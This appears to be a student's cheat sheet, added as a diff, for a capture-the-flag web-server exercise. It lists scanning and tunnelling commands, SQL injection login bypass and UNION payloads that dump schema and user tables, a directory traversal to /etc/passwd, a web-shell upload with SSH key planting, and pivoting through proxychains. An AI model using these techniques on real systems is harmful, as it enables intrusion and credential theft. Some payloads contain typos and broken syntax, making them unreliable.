@@ -1,0 +1,82 @@
+WEBSERVER
+
+
+Nmap Scan on box (Scan Based on what kind of box it is)
+    nmap -Pn -T4 -sT <ip> -p22,80,...
+port Interro
+    nc <ip> <PORT>
+        (IF port 80 feed trash)
+firefox the http ip
+    look around
+Found sign iin page
+    POSSIBLE SQL
+        Dumping data base Demo ###ONLY THING YOU CAN DO ON A LOGIN PAGE###
+                  enter login webpage
+                  'or 1='1
+                  F12 After login
+                  refresh
+                  View POST request on network tab
+                  Raw switch
+                  Copy and past results into URL bar with ? in front of it
+              Check for ENcoding
+        
+Found File explorer
+      Possibly DirectoryTraversal
+            Hinted at by "File to Read"
+            CAN ONLY READ FILES
+        ../../../../../....../etc/passwd
+                (Look for users you found from login page)
+        
+POSSIBLE UPLOAD (NEED AN UPLOAD[S] PAGE AND an ability to upload a file)
+    UPLOAD malicious file
+    REceived web shell
+    Upload ssh-key IMMEDIATLEY
+    
+nmap -Pn -T4 -sT <IP> --script http-enum.nse
+    /scripts/
+
+nikto -h <IP> 2>/dev/null
+
+CHECK ROBOTS.TXT
+========================================
+
+LOGIN to ssh
+whoami && hostname
+check for Priv Esc if the CTFD says so
+
+
+
+IF NO PRIV ESC then PIVOT
+
+check /etc/hosts
+ip a
+take first 3 octets and 'PING SWEEP'
+    If TTL is 64 then ignore bc its a router
+    Record other Ip's
+
+Back out of ssh
+Set up tunnels to First box
+Proxychain it
+sudo proxychains nmap -Pn -sT -T4 192.168.28.181,172 -p22,80,...
+    Add response to notes
+Interro Ports
+    proxychains nc 
+ssh -S /tmp/boo -O forward -L8080:<ip>:80 dummy
+    127.0.0.1:8080
+--------------------------------------------
+New Webpage
+    Gives a list 
+    SWL injection
+    try every option for vuln option
+        <option> OR 1=1
+    <vulnerable option>[' if string] UNION SELECT 1,2,3;#
+        Maneuver your statement based on response (1,3,2   1,2,3)
+            GOlden Statement
+            <vulnerable option>[' if string] UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;#
+            <vulnerable option>[' if string] UNION SELECT user_id, FROM SITEUSERS.USERS;#
+    CTFD will guide what you need to look for
+    
+    ADD TO CREDS
+        Decode from ROT13
+        
+    
